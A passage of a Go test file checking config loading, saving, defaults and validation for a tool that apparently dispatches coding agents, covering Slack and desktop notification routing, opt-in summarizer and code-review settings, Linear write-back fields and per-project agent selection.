	}
	// Priorities not named keep their defaults.
	if got := c.Notify.Routing["action"]; !reflect.DeepEqual(got, []string{"desktop", "slack"}) {
		t.Errorf("routing.action = %v, want default [desktop slack]", got)
	}
	if got := c.Notify.Routing["info"]; !reflect.DeepEqual(got, []string{"slack"}) {
		t.Errorf("routing.info = %v, want default [slack]", got)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("explicit reactions/notify must validate: %v", err)
	}
}

// Custom reaction/notify values round-trip through Save/Load unchanged.
func TestReactionsNotifyCustomRoundTrip(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	orig := &Config{}
	orig.Defaults.GlobalCap = 4
	orig.Reactions = defaultReactions()
	orig.Reactions.CIFailed = Reaction{Auto: false, Retries: 5, Message: "fix it"}
	orig.Notify = defaultNotify()
	orig.Notify.Desktop = false
	orig.Notify.SlackWebhookEnv = "HOOK_ENV"
	orig.Notify.Routing["info"] = []string{"desktop"}

	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(orig.Reactions, got.Reactions) {
		t.Errorf("reactions round trip:\n save: %+v\n load: %+v", orig.Reactions, got.Reactions)
	}
	if !reflect.DeepEqual(orig.Notify, got.Notify) {
		t.Errorf("notify round trip:\n save: %+v\n load: %+v", orig.Notify, got.Notify)
	}
}

// A fresh &Config{} (the setup wizard's starting point) does NOT persist a
// disabled reaction/notify policy: the zero tables are omitted from disk and
// reload to full defaults.
func TestFreshConfigSaveReloadsDefaults(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	if err := (&Config{}).Save(path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "[reactions") || strings.Contains(string(data), "[notify") {
		t.Errorf("fresh config should omit reaction/notify tables, got:\n%s", data)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(got.Reactions, defaultReactions()) {
		t.Errorf("reloaded reactions = %+v, want defaults", got.Reactions)
	}
	if !reflect.DeepEqual(got.Notify, defaultNotify()) {
		t.Errorf("reloaded notify = %+v, want defaults", got.Notify)
	}
}

// ResolveNotify reads the webhook URL from the named env var, maps the priority
// names to notify.Priority, and never surfaces the value in config or errors.
func TestResolveNotifyWebhookFromEnv(t *testing.T) {
	const secret = "https://hooks.slack.example/services/T00/B00/verysecretXYZ"

	c := &Config{}
	c.Notify = defaultNotify()
	c.Notify.SlackWebhookEnv = "LOLA_TEST_HOOK"

	t.Setenv("LOLA_TEST_HOOK", secret)
	nc := c.ResolveNotify()
	if nc.SlackWebhook != secret {
		t.Errorf("SlackWebhook = %q, want the env value", nc.SlackWebhook)
	}
	if nc.Desktop != c.Notify.Desktop {
		t.Errorf("Desktop = %v, want %v", nc.Desktop, c.Notify.Desktop)
	}
	if got := nc.Routing[notify.Urgent]; !reflect.DeepEqual(got, []string{"desktop", "slack"}) {
		t.Errorf("Routing[Urgent] = %v, want [desktop slack]", got)
	}
	if got := nc.Routing[notify.Info]; !reflect.DeepEqual(got, []string{"slack"}) {
		t.Errorf("Routing[Info] = %v, want [slack]", got)
	}

	// Unset env var → empty URL, never an error.
	c.Notify.SlackWebhookEnv = "LOLA_TEST_HOOK_DEFINITELY_UNSET"
	if got := c.ResolveNotify().SlackWebhook; got != "" {
		t.Errorf("SlackWebhook = %q, want empty when env unset", got)
	}
	// Empty env NAME → empty URL.
	c.Notify.SlackWebhookEnv = ""
	if got := c.ResolveNotify().SlackWebhook; got != "" {
		t.Errorf("SlackWebhook = %q, want empty when env name blank", got)
	}

	// The secret must never leak into the persisted config or a Validate error.
	// Only the env NAME is stored; the URL lives solely in the environment.
	c.Notify.SlackWebhookEnv = "LOLA_TEST_HOOK"
	c.Notify.Routing["urgent"] = []string{"pager"} // force a validation error
	path := filepath.Join(t.TempDir(), "config.toml")
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), secret) {
		t.Error("saved config.toml must never contain the resolved webhook URL")
	}
	if !strings.Contains(string(data), "LOLA_TEST_HOOK") {
		t.Error("saved config.toml should store the env var NAME")
	}
	if err := c.Validate(); err == nil {
		t.Error("invalid channel should fail validation")
	} else if strings.Contains(err.Error(), secret) {
		t.Error("Validate error must never contain the webhook value")
	}
}

// [notify.routing] validation: priority keys ∈ {urgent,action,info};
// channels ∈ {desktop,slack}. [reactions] retries must be >= 0.
func TestReactionsNotifyValidation(t *testing.T) {
	base := func() *Config {
		c := &Config{}
		c.Defaults.GlobalCap = 4
		c.Reactions = defaultReactions()
		c.Notify = defaultNotify()
		return c
	}

	cases := []struct {
		name    string
		mutate  func(c *Config)
		wantErr string // "" = must be valid
	}{
		{"defaults valid", func(c *Config) {}, ""},
		{"retries zero ok", func(c *Config) { c.Reactions.CIFailed.Retries = 0 }, ""},
		{"retries negative rejected", func(c *Config) { c.Reactions.CIFailed.Retries = -1 }, "reactions.ci_failed: retries must be >= 0"},
		{"retries negative on any reaction rejected", func(c *Config) { c.Reactions.Merged.Retries = -3 }, "reactions.merged: retries must be >= 0"},
		{"unknown priority rejected", func(c *Config) { c.Notify.Routing["critical"] = []string{"slack"} }, `unknown priority "critical"`},
		{"unknown channel rejected", func(c *Config) { c.Notify.Routing["urgent"] = []string{"pager"} }, `unknown channel "pager"`},
		{"empty channel list ok", func(c *Config) { c.Notify.Routing["info"] = nil }, ""},
		{"nil routing ok", func(c *Config) { c.Notify.Routing = nil }, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := base()
			tc.mutate(c)
			err := c.Validate()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("want valid, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("want error containing %q, got nil", tc.wantErr)
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("error missing %q:\n%v", tc.wantErr, err)
			}
		})
	}
}

func TestDurationRoundTrip(t *testing.T) {
	d := Duration(45 * time.Second)
	b, err := d.MarshalText()
	if err != nil {
		t.Fatal(err)
	}
	var back Duration
	if err := back.UnmarshalText(b); err != nil {
		t.Fatal(err)
	}
	if back != d {
		t.Errorf("round trip: %v != %v", back, d)
	}
	if err := back.UnmarshalText([]byte("not-a-duration")); err == nil {
		t.Error("expected parse error")
	}
}

// Linear write-back (P4) fields survive Save/Load unchanged, and a state-mode
// poll that sets them validates. A poll that leaves them at their zero values
// (like validPoll) already round-trips via TestSaveLoadRoundTrip.
func TestWriteBackRoundTrip(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")

	orig := &Config{}
	orig.Defaults.GlobalCap = 4
	orig.Reactions = defaultReactions()
	orig.Notify = defaultNotify()

	p := validPoll()
	p.DedupMode = "state"
	p.StateIDs = []string{"state-ready"}
	p.OnSpawnStateID = "state-inprogress" // not one of state_ids
	p.OnPRStateID = "state-review"
	p.OnMergedStateID = "state-done"
	p.BlockedLabelID = "label-blocked"
	p.CommentOnSpawn = true
	p.CommentOnPR = true
	p.CommentOnMerged = true
	p.CommentOnBlocked = true
	orig.Projects = []Project{p}

	if err := orig.Validate(); err != nil {
		t.Fatalf("state-mode write-back poll must validate: %v", err)
	}
	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(orig.Projects, got.Projects) {
		t.Errorf("write-back round trip mismatch:\n save: %+v\n load: %+v", orig.Projects, got.Projects)
	}
	if err := got.Validate(); err != nil {
		t.Errorf("reloaded write-back config must validate: %v", err)
	}
}

// The default lifecycle comment templates are non-empty and carry exactly the
// placeholders their doc contract promises — they are filled by plain string
// replacement, so a drift here would silently ship a broken comment.
func TestDefaultCommentTemplates(t *testing.T) {
	cases := []struct {
		name        string
		tmpl        string
		placeholder string // "" = no placeholder expected
	}{
		{"spawn", DefaultSpawnComment, "{{.Session}}"},
		{"pr", DefaultPRComment, "{{.PR}}"},
		{"merged", DefaultMergedComment, ""},
		{"blocked", DefaultBlockedComment, "{{.Detail}}"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if tc.tmpl == "" {
				t.Fatal("template must not be empty")
			}
			if tc.placeholder != "" && !strings.Contains(tc.tmpl, tc.placeholder) {
				t.Errorf("template %q missing placeholder %q", tc.tmpl, tc.placeholder)
			}
			// Rendering is plain strings.ReplaceAll: the intended placeholder is
			// substituted and no stray "{{" survives afterwards.
			rendered := strings.ReplaceAll(tc.tmpl, tc.placeholder, "X")
			if tc.placeholder == "" {
				rendered = tc.tmpl
			}
			if strings.Contains(rendered, "{{") {
				t.Errorf("template %q has an unrecognized placeholder after render: %q", tc.tmpl, rendered)
			}
		})
	}
}

// An absent [brain] table means the P5 brain is fully off: Enabled=false, both
// summarizers off, and the config validates — the OPT-IN, zero-behavior-change
// contract. The default instruction consts are non-empty and forbid code fences.
func TestBrainDefaultOffWhenAbsent(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := "[defaults]\nglobal_cap = 4\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if c.Brain != (BrainConfig{}) {
		t.Errorf("absent [brain] should give the zero BrainConfig, got %+v", c.Brain)
	}
	if c.Brain.Enabled || c.Brain.SummarizeEscalation || c.Brain.SummarizeApproved {
		t.Errorf("absent [brain] must be fully disabled, got %+v", c.Brain)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("config without [brain] must validate: %v", err)
	}

	for _, instr := range []string{BrainEscalationInstruction, BrainApprovedInstruction} {
		if instr == "" {
			t.Error("brain instruction must not be empty")
		}
		// The instructions tell claude not to EMIT code fences; they must not
		// contain a literal fence themselves.
		if strings.Contains(instr, "```") {
			t.Errorf("brain instruction must not contain a code fence: %q", instr)
		}
	}
}

// Enabling the brain with nothing else set turns on both summaries and defaults
// the timeout to DefaultBrainTimeoutSeconds; the model stays empty (claude
// default). This is the "enabled = true alone" ergonomic path.
func TestBrainEnabledDefaults(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := "[defaults]\nglobal_cap = 4\n\n[brain]\nenabled = true\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	want := BrainConfig{
		Enabled:             true,
		Model:               "",
		TimeoutSeconds:      DefaultBrainTimeoutSeconds,
		SummarizeEscalation: true,
		SummarizeApproved:   true,
	}
	if c.Brain != want {
		t.Errorf("brain = %+v, want %+v", c.Brain, want)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("enabled brain must validate: %v", err)
	}
}

// Explicitly-set brain fields survive load, including a disabling
// summarize_escalation=false while the brain is enabled (the analog of a
// reaction's explicit auto=false), and an explicit timeout that overrides the
// default. Unset summarizers still follow Enabled.
func TestBrainExplicitValuesKept(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[defaults]
global_cap = 4

[brain]
enabled = true
model = "claude-sonnet-4-5"
timeout_seconds = 45
summarize_escalation = false
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	want := BrainConfig{
		Enabled:             true,
		Model:               "claude-sonnet-4-5",
		TimeoutSeconds:      45,
		SummarizeEscalation: false, // explicit false kept, not reverted to Enabled
		SummarizeApproved:   true,  // unset → follows Enabled
	}
	if c.Brain != want {
		t.Errorf("brain = %+v, want %+v", c.Brain, want)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("explicit brain must validate: %v", err)
	}
}

// A fully-specified brain (including an explicit disabling zero) round-trips
// through Save/Load unchanged.
func TestBrainRoundTrip(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	orig := &Config{}
	orig.Defaults.GlobalCap = 4
	orig.Reactions = defaultReactions()
	orig.Notify = defaultNotify()
	orig.Brain = BrainConfig{
		Enabled:             true,
		Model:               "claude-opus-4-1",
		TimeoutSeconds:      90,
		SummarizeEscalation: true,
		SummarizeApproved:   false, // disabling zero must survive the round-trip
	}
	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if orig.Brain != got.Brain {
		t.Errorf("brain round trip:\n save: %+v\n load: %+v", orig.Brain, got.Brain)
	}
}

// A fresh &Config{} does NOT persist a [brain] table (the zero brain is
// unconfigured), and reloads to the disabled default.
func TestBrainFreshConfigOmitsTable(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	if err := (&Config{}).Save(path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "[brain") {
		t.Errorf("fresh config should omit the [brain] table, got:\n%s", data)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got.Brain != (BrainConfig{}) {
		t.Errorf("reloaded brain = %+v, want zero (disabled)", got.Brain)
	}
}

// An absent [review] table means the P9 QA buddy is fully off: Enabled=false,
// on_pr_open / send_to_agent off, and the config validates — the OPT-IN,
// zero-behavior-change contract. The default hand-off consts are non-empty.
func TestReviewDefaultOffWhenAbsent(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := "[defaults]\nglobal_cap = 4\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if c.Review != (ReviewConfig{}) {
		t.Errorf("absent [review] should give the zero ReviewConfig, got %+v", c.Review)
	}
	if c.Review.Enabled || c.Review.OnPROpen || c.Review.SendToAgent || c.Review.CommentOnLinear {
		t.Errorf("absent [review] must be fully disabled, got %+v", c.Review)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("config without [review] must validate: %v", err)
	}

	if ReviewToAgentPreamble == "" || ReviewNotifyTitle == "" {
		t.Error("review hand-off consts must not be empty")
	}
}

// Enabling the review with nothing else set turns on on_pr_open + send_to_agent
// and defaults the timeout to DefaultReviewTimeoutSeconds; comment_on_linear
// stays off and command stays empty (runner default). The "enabled = true alone"
// ergonomic path.
func TestReviewEnabledDefaults(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := "[defaults]\nglobal_cap = 4\n\n[review]\nenabled = true\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	want := ReviewConfig{
		Enabled:         true,
		Command:         "",
		OnPROpen:        true,
		SendToAgent:     true,
		CommentOnLinear: false,
		TimeoutSeconds:  DefaultReviewTimeoutSeconds,
	}
	if c.Review != want {
		t.Errorf("review = %+v, want %+v", c.Review, want)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("enabled review must validate: %v", err)
	}
}

// Explicitly-set review fields survive load, including a disabling
// send_to_agent=false while enabled (the analog of a reaction's explicit
// auto=false) and an explicit timeout overriding the default. Unset on_pr_open
// still follows Enabled; comment_on_linear is honored when set true.
func TestReviewExplicitValuesKept(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[defaults]
global_cap = 4

[review]
enabled = true
command = "coderabbit review --plain --type all"
timeout_seconds = 120
send_to_agent = false
comment_on_linear = true
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	want := ReviewConfig{
		Enabled:         true,
		Command:         "coderabbit review --plain --type all",
		OnPROpen:        true,  // unset → follows Enabled
		SendToAgent:     false, // explicit false kept, not reverted to Enabled
		CommentOnLinear: true,  // explicit true kept (default is false)
		TimeoutSeconds:  120,
	}
	if c.Review != want {
		t.Errorf("review = %+v, want %+v", c.Review, want)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("explicit review must validate: %v", err)
	}
}

// A fully-specified review (including a disabling zero and a command override)
// round-trips through Save/Load unchanged.
func TestReviewRoundTrip(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	orig := &Config{}
	orig.Defaults.GlobalCap = 4
	orig.Reactions = defaultReactions()
	orig.Notify = defaultNotify()
	orig.Review = ReviewConfig{
		Enabled:         true,
		Command:         "coderabbit review --plain --base main --type all",
		OnPROpen:        false, // disabling zero must survive the round-trip
		SendToAgent:     true,
		CommentOnLinear: true,
		TimeoutSeconds:  240,
	}
	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if orig.Review != got.Review {
		t.Errorf("review round trip:\n save: %+v\n load: %+v", orig.Review, got.Review)
	}
}

// A fresh &Config{} does NOT persist a [review] table (the zero review is
// unconfigured), and reloads to the disabled default.
func TestReviewFreshConfigOmitsTable(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	if err := (&Config{}).Save(path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "[review") {
		t.Errorf("fresh config should omit the [review] table, got:\n%s", data)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got.Review != (ReviewConfig{}) {
		t.Errorf("reloaded review = %+v, want zero (disabled)", got.Review)
	}
}

// CommandArgs splits the override on whitespace and yields nil for an
// empty/whitespace-only command (the "use the runner default" signal).
func TestReviewCommandArgs(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want []string
	}{
		{"empty is nil", "", nil},
		{"whitespace only is nil", "   \t ", nil},
		{"single token", "coderabbit", []string{"coderabbit"}},
		{"full argv", "coderabbit review --plain --type all",
			[]string{"coderabbit", "review", "--plain", "--type", "all"}},
		{"collapses runs of whitespace", "  coderabbit   review\t--plain ",
			[]string{"coderabbit", "review", "--plain"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ReviewConfig{Command: tc.cmd}.CommandArgs()
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("CommandArgs(%q) = %#v, want %#v", tc.cmd, got, tc.want)
			}
		})
	}
}

// [review] validation: timeout_seconds must be >= 0; nothing else is constrained.
func TestReviewTimeoutValidation(t *testing.T) {
	base := func() *Config {
		c := &Config{}
		c.Defaults.GlobalCap = 4
		return c
	}
	cases := []struct {
		name    string
		mutate  func(c *Config)
		wantErr string // "" = must be valid
	}{
		{"absent review valid", func(c *Config) {}, ""},
		{"timeout zero ok", func(c *Config) { c.Review = ReviewConfig{Enabled: true, TimeoutSeconds: 0} }, ""},
		{"timeout positive ok", func(c *Config) { c.Review = ReviewConfig{Enabled: true, TimeoutSeconds: 600} }, ""},
		{"timeout negative rejected", func(c *Config) { c.Review = ReviewConfig{Enabled: true, TimeoutSeconds: -1} }, "review.timeout_seconds must be >= 0"},
		{"negative timeout rejected even when disabled", func(c *Config) { c.Review = ReviewConfig{TimeoutSeconds: -5} }, "review.timeout_seconds must be >= 0"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := base()
			tc.mutate(c)
			err := c.Validate()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("want valid, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("want error containing %q, got nil", tc.wantErr)
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("error missing %q:\n%v", tc.wantErr, err)
			}
		})
	}
}

// [brain] validation: timeout_seconds must be >= 0; nothing else is constrained.
func TestBrainTimeoutValidation(t *testing.T) {
	base := func() *Config {
		c := &Config{}
		c.Defaults.GlobalCap = 4
		return c
	}
	cases := []struct {
		name    string
		mutate  func(c *Config)
		wantErr string // "" = must be valid
	}{
		{"absent brain valid", func(c *Config) {}, ""},
		{"timeout zero ok", func(c *Config) { c.Brain = BrainConfig{Enabled: true, TimeoutSeconds: 0} }, ""},
		{"timeout positive ok", func(c *Config) { c.Brain = BrainConfig{Enabled: true, TimeoutSeconds: 300} }, ""},
		{"timeout negative rejected", func(c *Config) { c.Brain = BrainConfig{Enabled: true, TimeoutSeconds: -1} }, "brain.timeout_seconds must be >= 0"},
		{"negative timeout rejected even when disabled", func(c *Config) { c.Brain = BrainConfig{TimeoutSeconds: -5} }, "brain.timeout_seconds must be >= 0"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := base()
			tc.mutate(c)
			err := c.Validate()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("want valid, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("want error containing %q, got nil", tc.wantErr)
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("error missing %q:\n%v", tc.wantErr, err)
			}
		})
	}
}

// AgentForProject resolves the coding-agent kind with the precedence:
// project override > [defaults].agent > the hard "claude" fallback. A lookup
// name that matches no [[project]] falls through to the defaults / claude.
func TestAgentForProject(t *testing.T) {
	cases := []struct {
		name          string
		defaultsAgent string
		projectAgent  string
		lookup        string
		want          string
	}{
		{"hard claude fallback when nothing set", "", "", "nori-app", "claude"},
		{"inherit from defaults", "codex", "", "nori-app", "codex"},
		{"project override wins over defaults", "codex", "opencode", "nori-app", "opencode"},
		{"project override with empty defaults", "", "codex", "nori-app", "codex"},
		{"unknown project falls back to defaults", "opencode", "codex", "ghost", "opencode"},
		{"unknown project with empty defaults is claude", "", "codex", "ghost", "claude"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := &Config{}
			c.Defaults.Agent = tc.defaultsAgent
			pr := validProject() // name "nori-app"
			pr.Agent = tc.projectAgent
			c.Projects = []Project{pr}
			if got := c.AgentForProject(tc.lookup); got != tc.want {
				t.Errorf("AgentForProject(%q) = %q, want %q", tc.lookup, got, tc.want)
			}
		})
	}
}

// [defaults].agent and every [[project]].agent accept empty (inherit) or a
// known kind (claude|codex|opencode); any other value is rejected with the
// enum error, matching the cycle_mode/match_mode style.
func TestAgentValidation(t *testing.T) {
	base := func() *Config {
		c := &Config{}
		c.Defaults.GlobalCap = 4
		c.Projects = []Project{validPoll()}
		return c
	}
	cases := []struct {
		name    string
		mutate  func(c *Config)
		wantErr string // "" = must be valid
	}{
		{"defaults agent empty ok", func(c *Config) { c.Defaults.Agent = "" }, ""},
		{"defaults agent claude ok", func(c *Config) { c.Defaults.Agent = "claude" }, ""},
		{"defaults agent codex ok", func(c *Config) { c.Defaults.Agent = "codex" }, ""},
		{"defaults agent opencode ok", func(c *Config) { c.Defaults.Agent = "opencode" }, ""},
		{"defaults agent unknown rejected", func(c *Config) { c.Defaults.Agent = "cursor" }, "defaults.agent must be one of claude|codex|opencode"},
		{"project agent empty ok", func(c *Config) { c.Projects[0].Agent = "" }, ""},
		{"project agent claude ok", func(c *Config) { c.Projects[0].Agent = "claude" }, ""},
		{"project agent codex ok", func(c *Config) { c.Projects[0].Agent = "codex" }, ""},
		{"project agent opencode ok", func(c *Config) { c.Projects[0].Agent = "opencode" }, ""},
		{"project agent unknown rejected", func(c *Config) { c.Projects[0].Agent = "aider" }, `project "nori-app": agent must be one of claude|codex|opencode`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := base()
			tc.mutate(c)
			err := c.Validate()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("want valid, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("want error containing %q, got nil", tc.wantErr)
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("error missing %q:\n%v", tc.wantErr, err)
			}
		})
	}
}

// The agent choice — [defaults].agent plus a per-[[project]].agent override —
// survives Save/Load unchanged and still validates.
func TestAgentRoundTrip(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	orig := &Config{}
	orig.Defaults.GlobalCap = 4
	orig.Defaults.Agent = "codex"
	orig.Reactions = defaultReactions()
	orig.Notify = defaultNotify()
	pr := validPoll()
	pr.Agent = "opencode"
	orig.Projects = []Project{pr}

	if err := orig.Validate(); err != nil {
		t.Fatalf("agent config must validate: %v", err)
	}
	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got.Defaults.Agent != "codex" {
		t.Errorf("defaults.agent = %q, want codex", got.Defaults.Agent)
	}
	if got.Projects[0].Agent != "opencode" {
		t.Errorf("project agent = %q, want opencode", got.Projects[0].Agent)
	}
	if !reflect.DeepEqual(orig.Projects, got.Projects) {
		t.Errorf("project round trip mismatch:\n save: %+v\n load: %+v", orig.Projects, got.Projects)
	}
	if err := got.Validate(); err != nil {
		t.Errorf("reloaded agent config must validate: %v", err)
	}
}

// A set [defaults].agent is written to disk verbatim; resolution never
// force-writes "claude" — an unset agent resolves at read time instead.
func TestAgentDefaultWrittenWhenSet(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	c := &Config{}
	c.Defaults.Agent = "codex"
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(data), `agent = "codex"`) {
		t.Errorf("set default agent should be written, got:\n%s", data)
	}
	// applyDefaults must not inject "claude" for an unset agent.
	if strings.Contains(string(data), `agent = "claude"`) {
		t.Errorf("agent must never be force-written to claude, got:\n%s", data)
	}
	fresh := &Config{}
	fresh.applyDefaults()
	if fresh.Defaults.Agent != "" {
		t.Errorf("applyDefaults set Defaults.Agent = %q, want empty (resolve at read time)", fresh.Defaults.Agent)
	}
}
